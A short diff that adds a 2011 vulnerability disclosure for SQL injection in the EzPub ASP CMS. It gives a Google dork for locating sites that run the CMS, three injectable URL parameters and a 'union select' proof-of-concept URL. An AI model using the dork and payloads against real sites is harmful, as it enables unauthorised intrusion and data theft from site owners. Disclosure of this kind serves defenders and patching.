@@ -1,0 +1,20 @@
+Title:    EzPub - Simple Classic ASP CMS Vulnerable to SQL Injection
+Vendor:   http://www.soft4web.ro
+Found by: p0pc0rn 08/03/2011
+Dork:     intext:"Powered by EZPub"
+
+
+SQL - Microsoft JET Database Engine error
+------------------------------------------
+
+view_article.asp?item=[SQL]
+http://site.com/page.asp?pID=[SQL]
+http://site.com/display.asp?sortby=sections&sID=[SQL]
+
+POC
+---
+
+http://site.com/view_article.asp?item=1 union select 1 from test.a
+
+thanks,
+-p0pc0rn-
